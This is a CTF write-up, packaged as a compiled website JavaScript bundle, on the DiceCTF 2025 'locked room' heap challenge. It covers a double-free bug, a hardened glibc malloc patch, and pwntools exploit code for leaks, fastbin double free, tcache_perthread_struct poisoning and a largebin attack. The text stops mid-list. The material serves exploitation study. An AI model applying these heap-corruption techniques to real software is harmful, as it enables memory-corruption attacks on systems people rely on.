"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3299],{6359:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>r});const i=JSON.parse('{"id":"ctf-writeups/dicectf-2025/locked-room","title":"locked room","description":"","source":"@site/pwn/ctf-writeups/dicectf-2025/locked-room.md","sourceDirName":"ctf-writeups/dicectf-2025","slug":"/ctf-writeups/dicectf-2025/locked-room","permalink":"/pwn/ctf-writeups/dicectf-2025/locked-room","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"description":"","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"r2uwu2s-resort","permalink":"/pwn/ctf-writeups/dicectf-2025/r2uwu2s-resort"},"next":{"title":"Test","permalink":"/pwn/category/test"}}');var a=t(4848),c=t(8453);const s={description:"",sidebar_position:2},l="locked room",o={},r=[{value:"Introduction",id:"introduction",level:2},{value:"Reversing",id:"reversing",level:2},{value:"Double free",id:"double-free",level:3},{value:"Libc patches",id:"libc-patches",level:3},{value:"PREV_FAST_FREED",id:"prev_fast_freed",level:4},{value:"tcache = fastbin",id:"tcache--fastbin",level:4},{value:"no escape?",id:"no-escape",level:4},{value:"No IO for you",id:"no-io-for-you",level:4},{value:"Other changes",id:"other-changes",level:4},{value:"Patching source",id:"patching-source",level:4},{value:"Exploitation",id:"exploitation",level:2},{value:"Handlers",id:"handlers",level:3},{value:"Leaking libc and heap",id:"leaking-libc-and-heap",level:3},{value:"Control tcache_perthread_struct",id:"control-tcache_perthread_struct",level:3},{value:"Now what?",id:"now-what",level:3},{value:"Largebin attack -&gt; Large Memory",id:"largebin-attack---large-memory",level:3},{value:"Overwriting av-&gt;top",id:"overwriting-av-top",level:3},{value:"Tcache stashing on av-&gt;top",id:"tcache-stashing-on-av-top",level:3},{value:"Fixing av-&gt;top",id:"fixing-av-top",level:3},{value:"Leaking stack",id:"leaking-stack",level:3},{value:"Skipping past canaries",id:"skipping-past-canaries",level:3},{value:"Largebin cleanup",id:"largebin-cleanup",level:3},{value:"Putting it all together",id:"putting-it-all-together",level:3},{value:"Exploit",id:"exploit",level:2}];function h(e){const n={a:"a",admonition:"admonition",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"locked-room",children:"locked room"})}),"\n",(0,a.jsx)(n.h2,{id:"introduction",children:"Introduction"}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (26).png",alt:""}),(0,a.jsx)("figcaption",{})]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"locked_room"})," was a difficult heap challenge from this CTF, where the gimmick was that the libc was patched with multiple security mitigations. I didn't solve it during this CTF (rip), but I did get close, and managed to solve it the next day. Anways, let the madness begin."]}),"\n",(0,a.jsx)(n.h2,{id:"reversing",children:"Reversing"}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (27).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:"checksec"})})]}),"\n",(0,a.jsx)(n.p,{children:"As expected, we have full protections on the main binary, cos why not."}),"\n",(0,a.jsxs)(n.p,{children:["The binary itself also isn't tooo interesting, just a simple heap note with just ",(0,a.jsx)(n.code,{children:"alloc"}),", ",(0,a.jsx)(n.code,{children:"free"})," and ",(0,a.jsx)(n.code,{children:"view"}),":"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdint.h>\n\n#define BUF_SIZE 20\n#define MAX_ALLOCS 100\n\ntypedef struct Alloc {\n    unsigned char * data;\n    uint64_t len;\n} Alloc;\n\nAlloc allocs[MAX_ALLOCS];\nint current_index = 0;\n\nvoid menu() {\n    write(1, "1. Alloc\\n", 9);\n    write(1, "2. Free\\n", 8);\n    write(1, "3. View\\n", 8);\n    write(1, "4. Exit\\n", 8);\n}\n\nvoid alloc_chunk() {\n    char buf[BUF_SIZE];\n    unsigned int size = 0;\n    if (current_index >= MAX_ALLOCS) {\n        write(1, "Out of space!\\n", 14);\n        return;\n    }\n    write(1, "Size?\\n> ", 8);\n    read(0, buf, BUF_SIZE);\n    size = strtoul(buf, NULL, 10);\n    if (size > 0x800) {\n        write(1, "Too big!\\n", 9);\n        return;\n    }\n    allocs[current_index].data = malloc(size);\n    allocs[current_index].len = 0;\n\n    write(1, "Data?\\n> ", 8);\n    size_t amt_read = read(0, allocs[current_index].data, size);\n    if (amt_read > 0) {\n        allocs[current_index].len = amt_read;\n    }\n\n    current_index++;\n    write(1, "Done!\\n", 6);\n}\n\nvoid free_chunk() {\n    char buf[BUF_SIZE];\n    unsigned int i = 0;\n    write(1, "Index?\\n> ", 9);\n    read(0, buf, BUF_SIZE);\n    i = strtoul(buf, NULL, 10);\n    if (i < MAX_ALLOCS) {\n        free(allocs[i].data);\n        allocs[i].len = 0;\n    } else {\n        write(1, "Invalid index!\\n", 15);\n        return;\n    }\n    write(1, "Done!\\n", 6);\n}\n\nvoid view_chunk() {\n    char buf[BUF_SIZE];\n    unsigned int i = 0;\n    write(1, "Index?\\n> ", 9);\n    read(0, buf, BUF_SIZE);\n    i = strtoul(buf, NULL, 10);\n    if (i < MAX_ALLOCS && allocs[i].data != NULL && allocs[i].len > 0) {\n        write(1, allocs[i].data, allocs[i].len);\n    } else {\n        write(1, "Invalid index!\\n", 15);\n    }\n}\n\nint main() {\n    char buf[BUF_SIZE];\n    setvbuf(stdin, 0, 2, 0);\n    setvbuf(stdout, 0, 2, 0);\n\n    write(1, "You\'re in a locked room. Can you escape?\\n", 41);\n    write(1, "I\'ll say it in red: \\x1B[31mIn this room, you can only malloc and free. Your goal is to escape and reach the flag.\\x1B[0m\\n", 116);\n    write(1, "I\'ll say it in blue: \\x1B[36mWith the hardened allocator, it is impossible to escape! You will be stuck here forever!\\x1B[0m\\n", 119);\n\n    while (1) {\n        menu();\n        write(1, "> ", 2);\n        unsigned long choice = 0;\n        read(0, buf, BUF_SIZE);\n        choice = strtoul(buf, NULL, 10);\n        switch (choice) {\n            case 1:\n                alloc_chunk();\n                break;\n            case 2:\n                free_chunk();\n                break;\n            case 3:\n                view_chunk();\n                break;\n            case 4:\n                write(1, "\\x1B[31mYou are incompetent!\\x1B[0m\\n", 30);\n            default:\n                _exit(0);\n        }\n    }\n    return 0;\n}\n'})}),"\n",(0,a.jsxs)(n.p,{children:["Emphasis on ",(0,a.jsx)(n.strong,{children:"simple"}),", as a common pattern in this binary, and the challenge as a whole, is that barebones functions like ",(0,a.jsx)(n.code,{children:"read"}),", ",(0,a.jsx)(n.code,{children:"write"})," and ",(0,a.jsx)(n.code,{children:"_exit"})," are used instead of IO functions and ",(0,a.jsx)(n.code,{children:"exit"})," which have complexity that can be attacked and manipulated, which reduces our options for RCE :("]}),"\n",(0,a.jsx)(n.h3,{id:"double-free",children:"Double free"}),"\n",(0,a.jsxs)(n.p,{children:["The bug isn't too hard to spot: when a chunk is freed, its ",(0,a.jsx)(n.code,{children:".len"})," field is nulled, but not the pointer itself, and since there's no check in ",(0,a.jsx)(n.code,{children:"free_chunk"})," for ",(0,a.jsx)(n.code,{children:".len == 0"}),", nothing stops us from freeing a chunk twice!"]}),"\n",(0,a.jsx)(n.h3,{id:"libc-patches",children:"Libc patches"}),"\n",(0,a.jsxs)(n.p,{children:["Well, nothing in the program at least. The interesting part of the challenge comes from the ",(0,a.jsx)(n.code,{children:"libc.patch"})," file we're given, which changes the ",(0,a.jsx)(n.code,{children:"malloc/"})," code in glibc source (version 2.35)."]}),"\n",(0,a.jsx)(n.h4,{id:"prev_fast_freed",children:"PREV_FAST_FREED"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-diff",children:"+/* size field is or'ed with PREV_FAST_FREED when previous adjacent chunk\n+  is a freed fastbin chunk. */\n+#define PREV_FAST_FREED 0x8\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Firstly, it introduces a new bit flag to put in size fields of chunks. The idea is to track which chunks have been freed to the fastbin, similarly to ",(0,a.jsx)(n.code,{children:"PREV_INUSE"})," with unsortedbin/smallbin/largebins, so that double frees can be better detected, as current measures are easy to bypass, along with other fastbin sanity checks."]}),"\n",(0,a.jsxs)(n.p,{children:["It also doubles as an anti-debugging measure, as ",(0,a.jsx)(n.code,{children:"vis_heap_chunks"})," struggles when faced with this flag >:("]}),"\n",(0,a.jsx)(n.h4,{id:"tcache--fastbin",children:"tcache = fastbin"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-diff",children:'@@ -3196,6 +3208,10 @@ tcache_get (size_t tc_idx)\n   tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n   --(tcache->counts[tc_idx]);\n   e->key = 0;\n+  e->next = NULL;\n+  if (__glibc_unlikely(csize2tidx (chunksize (mem2chunk (e)))) != tc_idx) {\n+    malloc_printerr ("malloc(): memory corruption (tcache)");\n+  }\n   return (void *) e;\n'})}),"\n",(0,a.jsx)(n.p,{children:"RIP tcache, you will be missed, as it now has the same check for a valid size field that fastbin does. This, along with the requirement that tcache (and fastbin) chunks are 16-byte aligned (so no misaligned size tricks), basically kills tcache as an easy win."}),"\n",(0,a.jsx)(n.h4,{id:"no-escape",children:"no escape?"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-diff",children:"@@ -3311,24 +3329,34 @@ __libc_malloc (size_t bytes)\n       && tcache->counts[tc_idx] > 0)\n     {\n       victim = tcache_get (tc_idx);\n+      mchunkptr victim_chunk = mem2chunk (victim);\n+      ar_ptr = arena_for_chunk (victim_chunk);\n+      max_address = (char *) (ar_ptr->top) + chunksize (ar_ptr->top);\n+      min_address = max_address - ar_ptr->system_mem;\n+      assert (((char *) victim_chunk) >= min_address);\n+      assert (((char *) victim_chunk + chunksize (victim_chunk)) <= ((char *) (ar_ptr->top)));\n       return tag_new_usable (victim);\n     }\n   DIAG_POP_NEEDS_COMMENT;\n #endif\n \n-  if (SINGLE_THREAD_P)\n-    {\n-      victim = tag_new_usable (_int_malloc (&main_arena, bytes));\n-      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||\n-\t      &main_arena == arena_for_chunk (mem2chunk (victim)));\n-      return victim;\n-    }\n+  victim = tag_new_usable (_int_malloc (&main_arena, bytes));\n+  mchunkptr victim_chunk = mem2chunk (victim);\n+  ar_ptr = arena_for_chunk (victim_chunk);\n+  max_address = (char *) (ar_ptr->top) + chunksize (ar_ptr->top);\n+  min_address = max_address - ar_ptr->system_mem;\n+  assert (!victim || chunk_is_mmapped (victim_chunk) ||\n+    &main_arena == arena_for_chunk (victim_chunk));\n+  assert (((char *) victim_chunk) >= min_address &&\n+    ((char *) victim_chunk + chunksize (victim_chunk)) <= ((char *) (ar_ptr->top)));\n+  return victim;\n"})}),"\n",(0,a.jsx)(n.p,{children:"This is arguably the most annoying change, which restricts where our allocations can be."}),"\n",(0,a.jsxs)(n.p,{children:["Maximum address is ",(0,a.jsx)(n.code,{children:"top + chunksize(top)"}),", which points to the end of the (allocated) heap region, and the minimum address is the maximum minus ",(0,a.jsx)(n.code,{children:"av->system_mem"}),", which is the total amount of memory currently allocated for that region, so the minimum would be the start of the region."]}),"\n",(0,a.jsx)(n.p,{children:"It also prevents the end of our chunk coming after the top chunk, so no overlapping chunks with the top chunk to corrupt it, or allocating past it."}),"\n",(0,a.jsxs)(n.p,{children:["These changes seem to be adapated from ",(0,a.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2084",children:"do_check_chunk"}),", and thankfully they only used those, cos the debug chunks are ","\ud83d\udc80"]}),"\n",(0,a.jsx)(n.h4,{id:"no-io-for-you",children:"No IO for you"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-diff",children:'@@ -298,13 +298,10 @@ static void\n  __malloc_assert (const char *assertion, const char *file, unsigned int line,\n \t\t const char *function)\n {\n-  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s\' failed.\\n",\n-\t\t     __progname, __progname[0] ? ": " : "",\n-\t\t     file, line,\n-\t\t     function ? function : "", function ? ": " : "",\n-\t\t     assertion);\n-  fflush (stderr);\n-  abort ();\n+  write(2, "Assertion failed.\\n", 18);\n+  write(2, assertion, strlen(assertion));\n+  write(2, "\\n", 1);\n+  _exit(-1);\n\n'})}),"\n",(0,a.jsxs)(n.p,{children:["Like I mentioned earlier, a pattern is using barebones functions, to reduce the attack surface for RCE, so now we can't use ",(0,a.jsx)(n.code,{children:"stderr"})," or ",(0,a.jsx)(n.a,{href:"https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README#4---code-execution-via-fake-custom-conversion-specifiers",children:"printf"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:["One interesting thing to note here though, is that there's a call to ",(0,a.jsx)(n.code,{children:"strlen"}),", which when used in libc, is called using libc's PLT and GOT, as it can use different architecture specific implementations like SSE2 or AVX2."]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (28).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:"Call to strlen@PLT in __malloc_assert"})})]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (25).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsx)("p",{children:"Partial RELRO in libc.so"})})]}),"\n",(0,a.jsxs)(n.p,{children:["Since we're using glibc 2.35, libc GOT is still writable (due to ",(0,a.jsx)(n.code,{children:"Partial RELRO"}),"), so this could be an avenue for code execution (however it's not what I used)."]}),"\n",(0,a.jsx)(n.h4,{id:"other-changes",children:"Other changes"}),"\n",(0,a.jsx)(n.p,{children:"There are a few more, smaller changes, such as:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["Nulling more leftover pointers in ",(0,a.jsx)(n.code,{children:"malloc"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Only recognising ",(0,a.jsx)(n.code,{children:"main_arena"}),": ",(0,a.jsx)(n.code,{children:"arena_for_chunk"})," always returns ",(0,a.jsx)(n.code,{children:"&main_arena"}),". (For this reason, when I refer to ",(0,a.jsx)(n.code,{children:"av"}),", this will be the same as ",(0,a.jsx)(n.code,{children:"main_arena"}),")."]}),"\n"]}),"\n",(0,a.jsx)(n.h4,{id:"patching-source",children:"Patching source"}),"\n",(0,a.jsxs)(n.p,{children:["One thing that you may find helpful when doing this challenge is to have reference to patched ",(0,a.jsx)(n.code,{children:"malloc.c"})," file, as this will help with reading the new source code, but also ",(0,a.jsx)(n.code,{children:"gdb"})," will recognise ",(0,a.jsx)(n.code,{children:"malloc.c"})," and you can debug ",(0,a.jsx)(n.code,{children:"malloc"})," and ",(0,a.jsx)(n.code,{children:"free"})," with source code. Just copy the ",(0,a.jsx)(n.code,{children:"malloc/malloc.c"})," and ",(0,a.jsx)(n.code,{children:"malloc/arena.c"})," files to your system, then do:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"$ patch -p2 -i ../libc.patch\npatching file arena.c\npatching file malloc.c\n"})}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (231).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsxs)("p",{children:[(0,a.jsx)("code",{children:"gdb"})," with patched source code"]})})]}),"\n",(0,a.jsx)(n.h2,{id:"exploitation",children:"Exploitation"}),"\n",(0,a.jsx)(n.p,{children:"So it looks like we've got our work cut out for us here. Let's start off easy, and write our handlers and get our leaks:"}),"\n",(0,a.jsx)(n.h3,{id:"handlers",children:"Handlers"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'send_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())\n\ncurrent_index = 0\ndef malloc(size, data=None):\n    if data is None:\n        data = b"X"\n    global current_index\n    send_choice(1)\n    p.sendlineafter(b"Size?\\n> ", str(size).encode())\n    p.sendafter(b"Data?\\n> ", data)\n    current_index += 1\n    return current_index-1\n\ndef free(i):\n    send_choice(2)\n    p.sendlineafter(b"Index?\\n> ", str(i).encode())\n\ndef view(i):\n    send_choice(3)\n    p.sendlineafter(b"Index?\\n> ", str(i).encode())\n    return p.recvuntil(b"1. Alloc\\n", drop=True)\n'})}),"\n",(0,a.jsx)(n.h3,{id:"leaking-libc-and-heap",children:"Leaking libc and heap"}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.code,{children:"alloc_chunk"})," works by setting the ",(0,a.jsx)(n.code,{children:".len"})," of a chunk to the amount of data we read in the ",(0,a.jsx)(n.code,{children:"read"})," call, so no read OOB, and ",(0,a.jsx)(n.code,{children:".len"})," is nulled on a free, so no read after free either + pointers nulled on ",(0,a.jsx)(n.code,{children:"malloc"})," call."]}),"\n",(0,a.jsx)(n.p,{children:"Fortunately we can use the UAF to overlap chunks to get leak. The basic idea is:"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["Allocate a chunk ",(0,a.jsx)(n.code,{children:"a"}),", then free it."]}),"\n",(0,a.jsxs)(n.li,{children:["Reallocate it with another chunk ",(0,a.jsx)(n.code,{children:"b"}),", setting ",(0,a.jsx)(n.code,{children:"b.len"})," to a suitable length."]}),"\n",(0,a.jsxs)(n.li,{children:["With UAF, free ",(0,a.jsx)(n.code,{children:"a"})," again. Since ",(0,a.jsx)(n.code,{children:"a = b"}),", we have UAF on ",(0,a.jsx)(n.code,{children:"b"}),"!"]}),"\n",(0,a.jsxs)(n.li,{children:["Now use ",(0,a.jsx)(n.code,{children:"b"})," to read the freed chunk."]}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"I opted to use a large chunk bordering the top chunk, effectively UAFing the top chunk, then any allocation would overlap with the UAFed one."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'# leaking libc\nuaf = malloc(0x800)\nfree(uaf)\n\ni = malloc(0x800, b"A"*8)\nmalloc(8)\n\nfree(uaf)\nlibc_leak = u64(view(i))\nlog.info(f"libc leak: {hex(libc_leak)}")\n\nlibc.address = libc_leak - (libc.sym.main_arena+96)\nlog.info(f"libc: {hex(libc.address)}")\n\n# leaking heap: PROTECT_PTR(0, heap+0xXXX)\ni = malloc(0x18, b"A"*8)\nfree(uaf)\nheap_leak = u64(view(i))\nlog.info(f"heap leak: {hex(heap_leak)}")\n\nheap = heap_leak << 12\nlog.info(f"heap: {hex(heap)}")\n'})}),"\n",(0,a.jsx)(n.h3,{id:"control-tcache_perthread_struct",children:"Control tcache_perthread_struct"}),"\n",(0,a.jsxs)(n.p,{children:["A useful tool for solving heap challenges is ",(0,a.jsx)(n.code,{children:"tcache_perthread_struct"}),", a goldmine for arbitrary writes, and it will be useful here too (even if it's only on the heap for now)."]}),"\n",(0,a.jsxs)(n.p,{children:["The problem is, to get initial corruption we only have a double free, and in this version of libc, double frees are heavily mitigated: tcache can't be double freed without a write after free, and the doubly linked list bins like unsortedbin also have measures. Normally we could use the fastbin double free trick, but now we have ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),", so ideally we want to find a way to clear that bit."]}),"\n",(0,a.jsxs)(n.p,{children:["Thankfully the patch isn't completely thorough in its enforcement of ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),". Looking through the patch for references to setting ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),", we can notice that there's some instances where it's left out."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-c",metastring:'title="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4369"',children:'victim = av->top;\nsize = chunksize (victim);\n\nif (__glibc_unlikely (size > av->system_mem))\n  malloc_printerr ("malloc(): corrupted top size");\n\nif ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))\n  {\n    remainder_size = size - nb;\n    remainder = chunk_at_offset (victim, nb);\n    av->top = remainder;\n    set_head (victim, nb | PREV_INUSE |\n              (av != &main_arena ? NON_MAIN_ARENA : 0));\n    set_head (remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk (av, victim, nb);\n    void *p = chunk2mem (victim);\n    alloc_perturb (p, bytes);\n    return p;\n  }\n'})}),"\n",(0,a.jsxs)(n.p,{children:["For example, the above snippet is untouched by the patch, and is for when an allocation is serviced from the top chunk. ",(0,a.jsx)(n.code,{children:"victim"})," is the chunk that will be allocated and returned to the user, and we can see that it will have the ",(0,a.jsx)(n.code,{children:"PREV_INUSE"})," bit set, and maybe the ",(0,a.jsx)(n.code,{children:"NON_MAIN_ARENA"})," bit, but ",(0,a.jsx)(n.strong,{children:"no"})," reference to ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),"."]}),"\n",(0,a.jsxs)(n.p,{children:["In other words, if the top chunk has ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),", it ",(0,a.jsx)(n.strong,{children:"won't"})," be preserved."]}),"\n",(0,a.jsx)(n.p,{children:"So now we have a plan for a double free on fastbin:"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["Allocate 2 chunks ",(0,a.jsx)(n.code,{children:"a"})," and ",(0,a.jsx)(n.code,{children:"b"}),", such that ",(0,a.jsx)(n.code,{children:"b"})," borders the top chunk."]}),"\n",(0,a.jsxs)(n.li,{children:["Free ",(0,a.jsx)(n.code,{children:"b"})," to fastbin. This sets top chunk's ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate from top chunk to clear ",(0,a.jsx)(n.code,{children:"PREV_FAST_FREED"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Free ",(0,a.jsx)(n.code,{children:"a"})," then ",(0,a.jsx)(n.code,{children:"b"}),"."]}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["Chunk ",(0,a.jsx)(n.code,{children:"a"})," is still needed to avoid the other double free protection, where it checks that the fastbin chunk being freed isn't at the top of fastbin."]}),"\n",(0,a.jsxs)(n.p,{children:["We can then use this to get an allocation on the heap to poison the ",(0,a.jsx)(n.code,{children:"fd"})," pointer of a ",(0,a.jsx)(n.code,{children:"tcache[0x290]"})," chunk, and point that to ",(0,a.jsx)(n.code,{children:"heap_base+0x10"}),", and now we control all tcache allocations!"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'class TcachePerthreadStruct:\n    def __init__(self):\n        self.counts = [0]*64\n        self.pointers = [0]*64\n    def set_count(self, size, count):\n        idx = (size - 0x20) // 16\n        self.counts[idx] = count\n    def set_pointer(self, size, pointer):\n        idx = (size - 0x20) // 16\n        self.pointers[idx] = pointer\n    def set(self, size, pointer, count=1):\n        self.set_pointer(size, pointer)\n        self.set_count(size, count)\n    def __bytes__(self):\n        output = b""\n        for count in self.counts:\n            output += p16(count)\n        for pointer in self.pointers:\n            output += p64(pointer)\n        return output\n\ntcache1 = malloc(0x288, flat({0x278: 0x21}))\ntcache2 = malloc(0x288)\n\ntcache = [malloc(0x18) for _ in range(7)]\nfast1 = malloc(0x18)\nfast2 = malloc(0x18)\n\n# fill tcache[0x20]\nfor i in tcache:\n    free(i)\n\n# free fastbin chunk next to top chunk\n# so that av->top has PREV_FAST_FREED\nfree(fast2)\n\n# allocate from top chunk to clear PREV_FAST_FREED\nmalloc(0x28)\n\n# double free fast2\nfree(fast1)\nfree(fast2)\n\n# alloc back tcache[0x20]\nfor _ in range(7):\n    malloc(0x18)\n\n# corrupt fastbin[0x20] to point to just before a tcache[0x290] chunk\nmalloc(0x18, p64(protect(heap + 0xd50, heap+0x1000)))\n\n# bring arb pointer to head of fastbin[0x20]\nmalloc(0x18)\nmalloc(0x18)\n\n# free 2 tcache[0x290] chunks\nfree(tcache1)\nfree(tcache2)\n\n# poison tcache[0x290] -> tcache_perthread_struct\nmalloc(0x18, flat({0x08: 0x291, 0x10: protect(heap+0x10, heap+0xd50)}))\n\ntcache = TcachePerthreadStruct()\ntcache.set(0x290, heap+0x10)\nmalloc(0x288)\nmalloc(0x288, bytes(tcache))\n'})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsxs)(n.p,{children:["Note that since we don't have an ",(0,a.jsx)(n.code,{children:"edit"})," function, if we need to change ",(0,a.jsx)(n.code,{children:"tcache_perthread_struct"})," later, we'll need to allocate on it again."]}),(0,a.jsxs)(n.p,{children:["We can just do that by keep setting ",(0,a.jsx)(n.code,{children:"tcache[0x290] -> heap+0x10"}),"."]})]}),"\n",(0,a.jsx)(n.h3,{id:"now-what",children:"Now what?"}),"\n",(0,a.jsx)(n.p,{children:"We can now corrupt the heap to our liking .... so what?"}),"\n",(0,a.jsxs)(n.p,{children:["We still have the tcache size and min/max address restrictions in play, so we can't aim our tcache allocations anywhere interesting. Ideally we'd want to corrupt the ",(0,a.jsx)(n.code,{children:"main_arena->top"})," and ",(0,a.jsx)(n.code,{children:"main_arena->system_mem"})," fields to adjust the min/max addresses, and open up our arbitrary allocation possibilites, but how do we do that without allocating onto them???"]}),"\n",(0,a.jsx)(n.h3,{id:"largebin-attack---large-memory",children:"Largebin attack -> Large Memory"}),"\n",(0,a.jsxs)(n.p,{children:["Just because we can't allocate outside the heap, doesn't mean we can't write anything! Introducing the largebin attack, which can be used to write a heap address to anywhere in memory, while only allocating inside the heap. While a heap address isn't too versatile, as in we can't write any libc addresses or code pointers, it's still useful, because what we can do is aim this at ",(0,a.jsx)(n.code,{children:"main_arena->system_mem"})," to increase the range!"]}),"\n",(0,a.jsxs)(n.p,{children:["While this only decreases the minimum address for now, it's a useful first step, and sets up future attacks ","\ud83d\udc40"]}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.a,{href:"../../pwn/setcontext",children:"how2heap"})," has a useful demo of this attack, but this is a brief overview of how to do it against some address ",(0,a.jsx)(n.code,{children:"target"}),":"]}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["Pick a largebin to use, such as ",(0,a.jsx)(n.code,{children:"0x400-0x430"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate 2 chunks ",(0,a.jsx)(n.code,{children:"a"})," and ",(0,a.jsx)(n.code,{children:"b"})," belonging to this largebin, where ",(0,a.jsx)(n.code,{children:"b"})," is smaller than ",(0,a.jsx)(n.code,{children:"a"})," (and separated from each other and top chunk)."]}),"\n",(0,a.jsxs)(n.li,{children:["Free ",(0,a.jsx)(n.code,{children:"a"})," to the unsortedbin."]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate a chunk larger than ",(0,a.jsx)(n.code,{children:"a"})," to send ",(0,a.jsx)(n.code,{children:"a"})," to ",(0,a.jsx)(n.code,{children:"largebin[0x400-0x430]"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Free ",(0,a.jsx)(n.code,{children:"b"})," to unsortedbin."]}),"\n",(0,a.jsxs)(n.li,{children:["Overwrite ",(0,a.jsx)(n.code,{children:"a->bk_nextsize"})," to ",(0,a.jsx)(n.code,{children:"target-0x20"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["Allocate a chunk larger than ",(0,a.jsx)(n.code,{children:"a"})," (and ",(0,a.jsx)(n.code,{children:"b"}),")."]}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["This will write the address of ",(0,a.jsx)(n.code,{children:"b"})," to ",(0,a.jsx)(n.code,{children:"target"}),", which in our case is ",(0,a.jsx)(n.code,{children:"main_arena->system_mem"}),"!"]}),"\n",(0,a.jsxs)(n.admonition,{type:"caution",children:[(0,a.jsxs)(n.p,{children:["One important thing to note about overwriting ",(0,a.jsx)(n.code,{children:"main_arena->system_mem"})," is that we don't want to make it too large. If it's much greater than ",(0,a.jsx)(n.code,{children:"av->top"}),", then the calculation:"]}),(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"min_address = (top + chunksize(top)) - system_mem\n"})}),(0,a.jsxs)(n.p,{children:['Will underflow and become "negative", and since the comparisons are unsigned, then the ',(0,a.jsx)(n.code,{children:"min_address"})," will be VERY large, and thus none of our allocations will be valid."]})]}),"\n",(0,a.jsxs)("figure",{children:[(0,a.jsx)("img",{src:"/assets/image (210).png",alt:""}),(0,a.jsx)("figcaption",{children:(0,a.jsxs)("p",{children:["Use of unsigned comparison ",(0,a.jsx)("code",{children:"jb"})," after _int_malloc"]})})]}),"\n",(0,a.jsx)(n.h3,{id:"overwriting-av-top",children:"Overwriting av->top"}),"\n",(0,a.jsxs)(n.p,{children:["So far we can shrink ",(0,a.jsx)(n.code,{children:"min_address"}),", but (for now) this is only useful for maybe allocating on the binary's writable area. However given:"]}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsxs)(n.li,{children:["The protections of ",(0,a.jsx)(n.code,{children:"locked_room"}),", like ",(0,a.jsx)(n.code,{children:"FULL RELRO"}),"."]}),"\n",(0,a.jsxs)(n.li,{children:["The lack of an ",(0,a.jsx)(n.code,{children:"edit"})," function, meaning we can't just overwrite pointers for an easy arbitrary write (would work for arbitrary read though)."]}),"\n",(0,a.jsx)(n.li,{children:"The lack of a PIE 